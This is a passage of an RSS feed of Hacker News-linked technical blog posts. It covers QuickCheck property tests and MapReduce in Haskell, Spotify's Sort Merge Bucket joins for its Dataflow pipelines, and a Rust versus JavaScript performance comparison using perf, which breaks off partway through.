<span id="cb5-2">    </span>
<span id="cb5-3">    it <span>"is associative"</span> <span>$</span> </span>
<span id="cb5-4">      property <span>$</span> \x y z <span>-&gt;</span> ((x ‚äï y) ‚äï z) <span>`shouldBe`</span> (x ‚äï (y ‚äï z))</span>
<span id="cb5-5">      </span>
<span id="cb5-6">    it <span>"has \"\" as left and right identity element"</span> <span>$</span></span>
<span id="cb5-7">      property <span>$</span> \x <span>-&gt;</span> (x ‚äï <span>""</span> <span>`shouldBe`</span> x) <span>.&amp;&amp;.</span> (<span>""</span> ‚äï x <span>`shouldBe`</span> x)</span></code></pre></div>
<p>The output looks promising:</p>
<div id="cb6"><pre><code><span id="cb6-1">  <span>The</span> Monoid <span>'Strings under concatenation'</span></span>
<span id="cb6-2">    <span>is</span> associative</span>
<span id="cb6-3">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb6-4">    <span>has</span> <span>""</span> as left and right identity element</span>
<span id="cb6-5">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>Now let‚Äôs try to test the non-commutativity:</p>
<div id="cb7"><pre><code><span id="cb7-1">    it <span>"is NOT commutative"</span> <span>$</span></span>
<span id="cb7-2">      property <span>$</span> \x y <span>-&gt;</span> x ‚äï y <span>`shouldNotBe`</span> y ‚äï x</span></code></pre></div>
<p>But unfortunately the output tells us that this is not true:</p>
<div id="cb8"><pre><code><span id="cb8-1">    <span>is</span> NOT commutative FAILED [1]</span>
<span id="cb8-2"></span>
<span id="cb8-3">  <span>1</span>) <span>Monoid</span>, The Monoid <span>'Strings under concatenation'</span>, is NOT commutative</span>
<span id="cb8-4">       <span>Falsifiable</span> (after 1 test)<span>:</span></span>
<span id="cb8-5">         <span>""</span></span>
<span id="cb8-6">         <span>""</span></span>
<span id="cb8-7">       <span>not</span> expected: <span>""</span></span></code></pre></div>
<p>We formulated the property in the wrong way. The <code>(‚äï)</code> <em>may be commutative for some</em> edge cases, e.g.&nbsp;when one or both of the arguments are <code>""</code>. But it is not commutative <em>in general</em> ‚Äì that is for all possible arguments.</p>
<p>We could rephrase this property as <em>‚ÄúThere exists at least one pair of arguments <span>\((x, y)\)</span> for which <span>\(\oplus\)</span> is not commutative‚Äù</em>:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ]\]</span></p>
<p>QuickCheck does not come with a mechanism for <em>existential quantification</em>. But as is has <code>forAll</code>, that is <em>universal quantification</em>. So we can try to make use of the following equivalence:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ] 
  \equiv 
  \neg \forall (x,y) \left [ x \oplus y = y \oplus x \right ]\]</span></p>
<p>Unfortunately we can not write this simply as <code>not forAll</code>, as <code>forAll</code> returns a <code>Property</code> but <code>not</code> expects a <code>Bool</code>. But as explained in <a href="https://stackoverflow.com/questions/42764847/is-there-a-there-exists-quantifier-in-quickcheck">this discussion on Stackoverflow</a> it is still posible to implement our own <code>exists</code>:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>exists ::</span> (<span>Show</span> a, <span>Arbitrary</span> a) <span>=&gt;</span> (a <span>-&gt;</span> <span>Bool</span>) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-2">exists <span>=</span> forSome <span>$</span> resize <span>1000</span> arbitrary</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span>forSome ::</span> (<span>Show</span> a, <span>Testable</span> prop) <span>=&gt;</span> <span>Gen</span> a <span>-&gt;</span> (a <span>-&gt;</span> prop) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-5">forSome gen prop <span>=</span></span>
<span id="cb9-6">  mapResult (\r <span>-&gt;</span> r {P.reason <span>=</span> <span>"No witness found."</span>, P.callbacks <span>=</span> []}) <span>$</span></span>
<span id="cb9-7">    once <span>$</span> disjoin <span>$</span> <span>replicate</span> <span>1000</span> <span>$</span> forAll gen prop</span></code></pre></div>
<p>Now we can rewrite the property <span>\(\exists (x,y) \left [ x \oplus y \neq y \oplus x \right ]\)</span> as follows:</p>
<div id="cb10"><pre><code><span id="cb10-1">    it <span>"is not commutative (via exists)"</span> <span>$</span></span>
<span id="cb10-2">      exists <span>$</span> \(x,y) <span>-&gt;</span> x ‚äï y <span>/=</span> y ‚äï x</span></code></pre></div>
<p>I like how close the Haskell code stays to the concise mathematical formulation! The output of this test fits much better into our intuitive understanding:</p>
<div id="cb11"><pre><code><span id="cb11-1">    <span>is</span> not commutative (via exists)</span>
<span id="cb11-2">      <span>+++</span> OK, passed 1 test.</span></code></pre></div>
<h2 id="sequential-mapreduce">Sequential MapReduce</h2>
<blockquote>
<p>MapReduce is a programming model and an associated implementation for processing and generating large data sets. Users specify <strong>a map function</strong> that processes a key/value pair to generate a set of intermediate key/value pairs, <strong>and a reduce function</strong> that merges all intermediate values associated with the same intermediate key.</p>
<p>[This] abstraction is inspired by the map and reduce primitives present in Lisp and many other functional languages. <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/16cb30b4b92fd4989b8619a61752a2387c6dd474.pdf">Quoted from Google Research</a></p>
</blockquote>
<p>I‚Äôm not going into more details here, as You‚Äôll find detailed information on this approach and a working example <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">in my original article</a>.</p>
<p>Here is the definition of a sequential MapReduce:</p>
<div id="cb12"><pre><code><span id="cb12-1">simpleMapReduce </span>
<span id="cb12-2"><span>  ::</span> (a <span>-&gt;</span> b)   <span>-- map function</span></span>
<span id="cb12-3">  <span>-&gt;</span> ([b] <span>-&gt;</span> c) <span>-- reduce function</span></span>
<span id="cb12-4">  <span>-&gt;</span> [a]        <span>-- list to map over</span></span>
<span id="cb12-5">  <span>-&gt;</span> c          <span>-- result</span></span>
<span id="cb12-6">simpleMapReduce mapFunc reduceFunc <span>=</span> reduceFunc <span>.</span> <span>map</span> mapFunc</span></code></pre></div>
<p>We can test the sequential MapReduce algorithm with the following property based test:</p>
<div id="cb13"><pre><code><span id="cb13-1">    it <span>"works correctly with a sequential map-reduce"</span> <span>$</span></span>
<span id="cb13-2">      property <span>$</span> \a b c d <span>-&gt;</span> (simpleMapReduce <span>reverse</span> (<span>foldr</span> (‚äï) <span>""</span>) [a,b,c,d]) </span>
<span id="cb13-3">                     <span>`shouldBe`</span> (<span>reverse</span> a) ‚äï (<span>reverse</span> b) ‚äï (<span>reverse</span> c) ‚äï (<span>reverse</span> d)</span></code></pre></div>
<h3 id="excurs-foldmap">Excurs: foldMap</h3>
<p>What I have shown so far just demonstrates the general mechanism of chaining <code>map</code> and <code>reduce</code> functions without implying any parallel execution. Essentially we are chaining a <code>map</code> with a <code>fold</code> (i.e.&nbsp;reduction) function. In the Haskell base library there is a higher order function <code>foldMap</code> that covers exactly this pattern of chaining. Please note that <code>foldMap</code>does only a single traversal of the foldable data structure. It fuses the <code>map</code> and <code>reduce</code> phase into a single one by function composition of <code>mappend</code> and the mapping function <code>f</code>:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>-- | Map each element of the structure to a monoid,</span></span>
<span id="cb14-2"><span>-- and combine the results.</span></span>
<span id="cb14-3"><span>foldMap</span><span> ::</span> (<span>Foldable</span> t, <span>Monoid</span> m) <span>=&gt;</span> (a <span>-&gt;</span> m) <span>-&gt;</span> t a <span>-&gt;</span> m</span>
<span id="cb14-4"><span>foldMap</span> f <span>=</span> <span>foldr</span> (<span>mappend</span> <span>.</span> f) <span>mempty</span></span></code></pre></div>
<h2 id="parallel-mapreduce">Parallel MapReduce</h2>
<p>Now we come to the tricky part that kicked off this whole discussion: parallelism.</p>
<p>As an example we consider a simple sequential MapReduce, taking an input list of <code>Int</code>s, computing their squares and computing the sum of these squares:</p>
<div id="cb15"><pre><code><span id="cb15-1">Œª<span>&gt;</span> simpleMapReduce (<span>^</span><span>2</span>) (<span>foldr</span> (<span>+</span>) <span>0</span>) [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>]</span>
<span id="cb15-2"><span>30</span></span></code></pre></div>
<p>Let‚Äôs try to design this as a massively parallelized algorithm:</p>
<ol type="1">
<li><p>Mapping of <code>(^2)</code> over the input-list <code>[1,2,3,4]</code> would be started in parallel to the reduction of the intermediary list of squares by <code>(foldr (+) 0)</code>.</p></li>
<li><p>The mapping phase will be executed as a set of parallel computations (one for each element of the input list).</p></li>
<li><p>The reduction phase will also be executed as a set of parallel computations (one for each addition).</p></li>
</ol>
<p>Of course the reduction phase can begin only when at least one list element is squared. So in effect the mapping process would have to start first. The parallel computation of squares will result in a non-deterministic sequence of computations. In particular it is not guaranteed that all elements of the input list are processed in the original list order. So it might for example ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112441</guid>
            <pubDate>Fri, 12 Feb 2021 11:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020]]>
            </title>
            <description>
<![CDATA[
Score 195 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26111993">thread link</a>) | @SirOibaf
<br/>
February 12, 2021 | https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020 | <a href="https://web.archive.org/web/*/https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <!-- post title -->
        

        <div>
            <p><img src="https://engineering.atspotify.com/wp-content/themes/theme-spotify/images/icon.png" alt=""></p><p><span>February 11, 2021</span>
                
            </p>
        </div>
        <!-- post details -->
        <p><a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020/" title="How Spotify Optimized the Largest Dataflow Job Ever for Wrapped 2020">
                        <img src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image1.gif" alt="" loading="lazy" data-image-size="post-thumbnail" data-stateless-media-bucket="rnd-atspotify" data-stateless-media-name="sites/2/2021/02/image1.gif">                    </a></p>

        <!-- /post title -->

        
<p>In this post we‚Äôll discuss how Spotify optimized and sped up elements from our largest Dataflow job, <a rel="noreferrer noopener" href="https://engineering.atspotify.com/2020/02/18/spotify-unwrapped-how-we-brought-you-a-decade-of-data/" target="_blank">Wrapped 2019</a>, for <a href="https://open.spotify.com/genre/2020-page">Wrapped 2020</a> using a technique called Sort Merge Bucket (SMB) join. We‚Äôll present the design and implementation of SMB and how we incorporated it into our data pipelines.</p>



<h2>Introduction</h2>



<p>Shuffle is the core building block for many big data transforms, such as a join, GroupByKey, or other reduce operations. Unfortunately, it‚Äôs also one of the most expensive steps in many pipelines. Sort Merge Bucket is an optimization that reduces shuffle by doing work up front on the producer side. The intuition is that for datasets commonly and frequently joined on a known key, e.g., user events with user metadata on a user ID, we can write them in bucket files with records bucketed and sorted by that key. By knowing which files contain a subset of keys and in what order, shuffle becomes a matter of merge-sorting values from matching bucket files, completely eliminating costly disk and network I/O of moving key‚Äìvalue pairs around. Andrea Nardelli carried out the original investigation on Sort Merge Buckets for his <a href="http://kth.diva-portal.org/smash/get/diva2:1334587/FULLTEXT01.pdf">2018 master‚Äôs thesis</a>, and we started looking into generalizing the idea as a <a rel="noreferrer noopener" href="https://spotify.github.io/scio/extras/Sort-Merge-Bucket.html" target="_blank">Scio module</a> afterwards.</p>



<h2>Design and Implementation</h2>



<p>The majority of the data pipelines at Spotify are written in <a rel="noreferrer noopener" href="https://github.com/spotify/scio" target="_blank">Scio</a>, a Scala API for <a href="https://beam.apache.org/">Apache Beam</a>, and run on the <a href="https://cloud.google.com/dataflow">Google Cloud Dataflow</a> service. We implemented SMB in Java to be closer to the native Beam SDK (and even wrote and collaborated on a <a href="https://docs.google.com/document/d/1AQlonN8t4YJrARcWzepyP7mWHTxHAd6WIECwk1s3LQQ/edit?usp=sharing">design document with the Beam community</a>), and provide Scala syntactic sugar in Scio like many other I/Os. The design is modularized into the main components listed below ‚Äî we‚Äôll start with the two top-level SMB <a href="https://beam.apache.org/documentation/programming-guide/#transforms" target="_blank" rel="noreferrer noopener">PTransforms</a> ‚Äî the write and read operations SortedBucketSink and SortedBucketSource.</p>



<h3>SortedBucketSink</h3>



<p>This transform writes a <a rel="noreferrer noopener" href="https://beam.apache.org/documentation/programming-guide/#pcollections" target="_blank">PCollection</a>&lt;T&gt; (where T has a corresponding <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/FileOperations.java" target="_blank" rel="noreferrer noopener">FileOperations&lt;T&gt;</a> instance) in SMB format. It first extracts keys and assigns bucket IDs using logic provided by <a href="https://github.com/spotify/scio/blob/master/scio-smb/src/main/java/org/apache/beam/sdk/extensions/smb/BucketMetadata.java" target="_blank" rel="noreferrer noopener">BucketMetadata</a>, groups key‚Äìvalues by the ID, sorts all values, and then writes them into files corresponding to bucket IDs using the FileOperations instance.</p>



<p>In addition to the bucket files, a JSON file is also written to the output directory representing the information from BucketMetadata that‚Äôs necessary to read the source: the number of buckets, the hashing scheme, and the instructions to extract the key from each record (for example, for Avro records we can encode this instruction with the name of the GenericRecord field containing the key).</p>



<figure><img loading="lazy" width="700" height="255" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-700x255.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-250x91.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-768x280.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5-120x44.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image5.png 1180w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>SortedBucketSource</h3>



<p>This transform reads from one or more sources written in SMB format with the same key and hashing scheme. It opens file handles for corresponding buckets from each source (using FileOperations&lt;T&gt; for that input type) and merges them while maintaining sorted order. Results are emitted as <a rel="noreferrer noopener" href="https://github.com/apache/beam/blob/master/sdks/java/core/src/main/java/org/apache/beam/sdk/transforms/join/CoGbkResult.java" target="_blank">CoGbkResult</a> objects per key group, the same class Beam uses for regular Cogroup operations, so the user can extract the results per source with the correct parameterized type.</p>



<figure><img loading="lazy" width="700" height="365" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-700x365.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-250x130.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-768x400.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7-120x63.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image7.png 1067w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<h3>FileOperations</h3>



<p>FileOperations abstracts away the reading and writing of individual bucket files. Since we need fine-grained control over the exact elements and their order in every file, we cannot leverage the existing Beam file I/Os, which operate on a PCollection level and abstract away the locality and order of elements. Instead, SMB file operations happen at a lower level of BoundedSource for input and ParDo for output. Currently Avro, BigQuery TableRow JSON, and TensorFlow TFRecord/Example records are supported. We plan to add other formats like Parquet as well.</p>



<h3>BucketMetadata</h3>



<p>This class abstracts the keying and bucketing of elements, and includes information such as key field, class, number of buckets, shards, and hash function. The metadata is serialized as a JSON file alongside data files when writing, and used to check compatibility when reading SMB sources.</p>



<h3>Optimizations and Variants</h3>



<p>Over the last year and a half we‚Äôve been adopting SMB at Spotify for various use cases, and accumulated many improvements to handle the scale and complexity of our data pipelines.</p>



<ul><li><strong>Date partitioning:</strong> At Spotify, event data is written to Google Cloud Services (GCS) in hourly or daily partitions. A common data engineering use case is to read many partitions in a single pipeline ‚Äî for example, to compute stream count over the last seven days. For a non-SMB read, this can be easily done in a single PTransform using wildcard file patterns to match files across multiple directories. However, unlike most File I/Os in Beam, the SMB Read API requires the input to be specified as a directory, rather than a file pattern (this is because we need to check the directory‚Äôs metadata.json file as well as the actual record files). Additionally, it must match up bucket files across partitions as well as across different sources, while ensuring that the CoGbkResult output correctly groups data from all partitions of a source into the same TupleTag key. We evolved the SMB Read API to accept one or more directories <em>per source</em>.&nbsp;</li></ul>



<ul><li><strong>Sharding:</strong> Although the Murmur class of hash functions we use during bucket assignment usually ensures an even distribution of records across buckets, in some instances one or more buckets may be disproportionately large if the key space is skewed, creating possible OOM errors when grouping and sorting records. In this case, we allow users to specify a number of <em>shards</em> to further split each bucket file. During the bucket assignment step, a value between [0, numShards) is generated randomly <a href="https://beam.apache.org/documentation/runtime/model/#bundling-and-persistence"><em>per bundle</em></a>. Since this value is computed completely orthogonally to the bucket ID, it can break up large key groups across files. Since each shard is still written in sorted order, they can simply be merged together at read time.</li></ul>



<ul><li><strong>Parallelism:</strong> Since the number of buckets in an SMB sink is always a power of 2, we can come up with a joining scheme across sources with different numbers of buckets based off of a desired level of parallelism specified by the user. For example, if the user wants to join Source 1 with 4 buckets and Source 2 with 2 buckets, they can specify either:<ul><li><strong>Minimum parallelism,</strong> or ‚ÄúMerge Greatest Buckets‚Äù strategy: 2 parallel readers will be created. Each reader will read 2 buckets from source A and 1 from source B, merging them together. Because bucket IDs are assigned by taking the integer hash value of the key modulo the desired number of buckets, mathematically we know that the key spaces of the merged buckets overlap.</li><li><strong>Maximum parallelism,</strong> or ‚ÄúLeast Bucket Replication‚Äù strategy: 4 parallel readers will be created. Each reader will read 1 bucket from Source A and 1 from Source B. After merging each key group, the reader will have to rehash the key modulo the greatest number of buckets, to avoid emitting duplicate values. Therefore, even though this strategy achieves a higher level of parallelism, there is some overhead of computing duplicate values and rehashing to eliminate them.</li><li><strong>Auto parallelism:</strong> Creates a number of readers between minimal and maximal amounts, based on a desired split size value provided by the Runner at runtime.</li></ul></li></ul>



<figure><img loading="lazy" width="700" height="459" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-700x459.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-250x164.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-768x504.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3-120x79.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image3.png 1115w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>SortedBucketTransform:</strong> A common usage pattern is for pipelines to enrich an existing dataset by joining it with one or more other sources, then writing it to an output location. We decided to specifically support this in SMB with a unique PTransform that reads, transforms, and writes output using the same keying and bucketing scheme. By doing the read/transform/write logic per bucket on the same worker, we can avoid having to reshuffle the data and recompute buckets ‚Äî since the key is the same, we know that the transformed elements from bucket M of the inputs also correspond to bucket M in the output, in the same sorted order as they were read from.</li></ul>



<figure><img loading="lazy" width="700" height="320" src="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png" alt="" srcset="https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-700x320.png 700w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-250x114.png 250w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-768x351.png 768w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4-120x55.png 120w, https://storage.googleapis.com/rnd-atspotify/sites/2/2021/02/image4.png 902w" sizes="(max-width: 700px) 100vw, 700px"></figure>



<ul><li><strong>External Sort:</strong> We made a number of improvements to Beam‚Äôs <a href="https://github.com/apache/beam/tree/master/sdks/java/extensions/sorter">external sorter extension</a>, including replacing the Hadoop sequence file with the native file I/O, removing the 2GB memory limit, and reducing disk usage and coder overhead.</li></ul>



<h2>Adoption ‚Äî Core Data Producers</h2>



<p>Since SMB requires data to be bucketed and sorted in a specific fashion, the adoption naturally starts from the producer of that data. A majority of the Spotify data processing relies on a few core data sets that act as single sources of truth for various business domains like streaming activities, user metadata and streaming context. We worked with the maintainer of these data sets to convert a year‚Äôs worth of data to SMB format.</p>



<p>Implementation was straightforward since SortedBucketSink is mostly a drop-in replacement for the vanilla Avro sink with some extra settings. We were using Avro sink with the sharding option to control the number and size of output files. After migrating to SMB, we did not notice any major bump in terms of vCPU, vRAM, or wall time since sharding requires a full shuffle similar to the additional cost of SMB sinks. A few other settings we have since had to tweak:</p>



<ul><li>Agree on user_id as a hexadecimal string as bucket and sort key, since we need the same key type and semantic across all SMB datasets.</li><li>Set compression to DEFLATE with level 6 to be consistent with the default Avro sink in Scio. As a nice side effect of data being bucketed and sorted by key, we observed ~50% reduction in storage from better compression due to collocation of similar records.</li><li>Make sure output files are backwards compatible. SMB output files have ‚Äúbucket-X-shard-Y‚Äù in their names but otherwise contain the same records with the same schema. So existing pipelines can consume them without any code change; they just do not leverage the speedup in certain join cases.</li></ul>



<h2>Adoption ‚Äî Wrapped 2020</h2>



<p>Once the core datasets were available in SMB format, we ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020">https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</a></em></p>]]>
            </description>
            <link>https://engineering.atspotify.com/2021/02/11/how-spotify-optimized-the-largest-dataflow-job-ever-for-wrapped-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111993</guid>
            <pubDate>Fri, 12 Feb 2021 09:44:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Showdown: Rust vs Javascript (2020)]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 102 (<a href="https://news.ycombinator.com/item?id=26111387">thread link</a>) | @KingOfCoders
<br/>
February 11, 2021 | https://cesarvr.io/post/rust-performance/ | <a href="https://web.archive.org/web/*/https://cesarvr.io/post/rust-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After spending some weeks playing with Rust, I felt ready to test my skills and try some programming challenges in the <a href="https://adventofcode.com/">Advent Of Code</a>. My approach to tackle some of those challenges was to solve them using Javascript (I use it in my day to day) first and then port the code to Rust. While writing the port I just focus on getting the Rust code as elegant as possible to achieve that I research the Rust API's to get syntactically correct. It was after finishing porting this <a href="https://adventofcode.com/2018/day/5">puzzle</a> in particular and feeling a sense of accomplishment that I decided to test how the Rust compiled code will perform against Javascript interpreter.</p><h2 id="naive-algorithm">Naive Algorithm</h2><hr><p>Before jumping to the whom-was-slower-and-why, let‚Äôs take a quick look at <a href="https://adventofcode.com/2018/day/5">puzzle</a> (so you see there is no hidden agenda) which goes like this:</p><p>You are given an input string with <code>N</code> amount of characters and we should write an algorithm that find and remove any sequential pairs of characters that similar but have different capitalisation, examples of this are:</p><div><pre><code data-lang="sh">bB <span># Remove</span>
bb <span># Do Nothing</span>
ab <span># Do Nothing</span>
</code></pre></div><p>The algorithm should re-evaluate the string recursively searching for new pairs created after the removal, something like tetris.</p><p>We have this input:</p><p>We should remove <code>bB</code> to get:</p><p>Then because <code>aA</code> has been formed we should eliminated this too:</p><p>Then we remove <code>dD</code> and the final string should be:</p><h3 id="my-solution">My Solution</h3><p>To solve this I wrote two functions, one that <code>process</code> takes array of characters, traverse the array a pair at a time and validate that they follow the rules mentioned above:</p><h4 id="rust">Rust</h4><hr><div><pre><code data-lang="rust"><span>fn</span> <span>process</span>(tokens: <span>&amp;</span><span>mut</span> Vec<span>&lt;</span>String<span>&gt;</span>) -&gt; <span>i32</span> {
  <span>let</span> <span>mut</span> polymer: Vec<span>&lt;</span>String<span>&gt;</span> <span>=</span> Vec::new();

  <span>while</span> <span>let</span> Some(token) <span>=</span> tokens.pop() {
      <span>if</span> polymer.is_empty() {
          polymer.push(token);
          <span>continue</span>;
      }

      <span>let</span> candidate <span>=</span> polymer.pop().unwrap();

      <span>if</span> <span>!</span>react(<span>&amp;</span>candidate, <span>&amp;</span>token) {
          polymer.push(candidate.to_string());
          polymer.push(token.to_string());
      }
  }

  polymer.len() <span>as</span> <span>i32</span>
}
</code></pre></div><h4 id="javascript">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>process</span>(<span>data</span>) {
  <span>let</span> <span>queue</span> <span>=</span> []  <span>// Save here tested characters.
</span><span></span>
  <span>while</span>(<span>data</span>.<span>length</span> <span>&gt;</span> <span>0</span>) {
    <span>let</span> <span>candidate_1</span> <span>=</span> <span>data</span>.<span>pop</span>()
    <span>let</span> <span>candidate_2</span> <span>=</span> <span>queue</span>.<span>pop</span>() <span>// get the last character that passed the test.
</span><span></span>
    <span>if</span> (<span>candidate_2</span> <span>===</span> <span>undefined</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
      <span>continue</span>
    }

    <span>let</span> <span>react</span> <span>=</span> <span>reacting</span>(<span>candidate_1</span>, <span>candidate_2</span>)

    <span>if</span>(<span>!</span><span>react</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_2</span>)
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
    }
  }

  <span>return</span> <span>result</span>.<span>length</span>
}

</code></pre></div><blockquote><p><em>Notice</em> the <em>performance</em> optimization by keeping the last character in a different queue, that way we don‚Äôt need to traverse the whole array looking for matches after a previous removal.</p></blockquote><p>Then each pair of characters is evaluated using a function called <code>react</code> that returns <code>true</code> or <code>false</code> if the pair need to be removed:</p><h4 id="rust-1">Rust</h4><hr><div><pre><code data-lang="rust">
  <span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {
        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
  }
</code></pre></div><h4 id="javascript-1">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>react</span>(<span>candidate_1</span>, <span>candidate_2</span>) {
  <span>if</span> (<span>candidate_1</span>.<span>toLowerCase</span>() <span>===</span> <span>candidate_2</span>.<span>toLowerCase</span>()) {
    <span>if</span> ( <span>candidate_1</span> <span>!==</span> <span>candidate_2</span> ) {
      <span>return</span> <span>true</span>
    }
  }

  <span>return</span> <span>false</span>
}
</code></pre></div><blockquote><p>Basically is a rudimentary implementation of an <strong>equals-ignore-case</strong> plus an additional check to see if they are they same character (the same capitalization).</p></blockquote><p>To complete the challenge each version (Rust, Javascript) needs to reduce a large string (<a href="https://adventofcode.com/2018/day/5/input">50K character</a>) which is good enough to test how well one version performs against the other, then I run each code using Linux <code>time</code> and got this:</p><div><pre><code data-lang="python"><span># Javascript (Node.js)</span>
  real  <span>0</span>m0<span>.</span><span>374</span>s
  user  <span>0</span>m0<span>.</span><span>301</span>s
  sys   <span>0</span>m0<span>.</span><span>030</span>s

<span># Rust</span>
  real  <span>0</span>m0<span>.</span><span>720</span>s
  user  <span>0</span>m0<span>.</span><span>636</span>s
  sys   <span>0</span>m0<span>.</span><span>012</span>s
</code></pre></div><p>This is a surprising turn of events, here we can see the Rust version is <code>2x</code> slower than Javascript, How? My first reaction (in an act of self denial) was to check the compiler flags <code>opt-level</code> and after checking that was fine, which to be honest won‚Äôt make a difference, I started to look for inefficiencies in the code, first using the ancient <a href="http://www.brendangregg.com/methodology.html">Drunk man anti-method</a> technique and when that didn‚Äôt work, I end up settling for a more scientific method of profiling my code with <a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a>.</p><h2 id="debugging">Debugging</h2><hr><p>Every time you are debugging a performance issues you might feel tempted to start adding your own function to calculate the duration of suspicious section of code (like I used to do, in the past). <a href="http://www.brendangregg.com/perf.html">Perf</a> does this for you by taking various approaches such as listening to CPU/Kernel <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/developer_guide/perf">performance events</a> metrics emitted by the system in reaction of your process while running. Things like this makes perf the tool of choice to debug performance issues, so let‚Äôs see how it works.</p><h3 id="debugging-symbols">Debugging Symbols</h3><p>Before we start we need to enable the <a href="http://carol-nichols.com/2015/12/09/rust-profiling-on-osx-cpu-time/">debugging symbols</a> on the Rust compiler, this will make <code>perf</code> reports more informative. To enable this add <code>debug=true</code> to the <code>Cargo.toml</code>:</p><div><pre><code data-lang="toml">[<span>profile</span>.<span>release</span>]
<span>opt</span><span>-</span><span>level</span> = <span>3</span>
<span>debug</span>=<span>true</span>
</code></pre></div><h3 id="attaching-perf">Attaching Perf</h3><p>I recompiled the code and attached <code>perf</code>:</p><div><pre><code data-lang="zsh">cargo build
./target/release/day-5 &amp; perf record -F <span>99</span> -p <span>`</span>pgrep day-5<span>`</span>
</code></pre></div><ul><li>First we run the Rust program (<code>day-5</code>) and we send it to the background using the ampersand (<code>&amp;</code>) symbol.</li><li>Next to it, so it executes immediately, we run <code>perf</code> that receives the process identifier (<a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a>) courtesy of <code>pgrep day-5</code>.</li><li>The <a href="https://linux.die.net/man/1/pgrep">pgrep</a> command returns the <a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a> of a process by name.</li></ul><p>Here is the output:</p><div><pre><code data-lang="bash"><span>[</span>1<span>]</span> <span>27466</span>
sample size <span>50003</span>
--
solution 1: <span>9526</span>
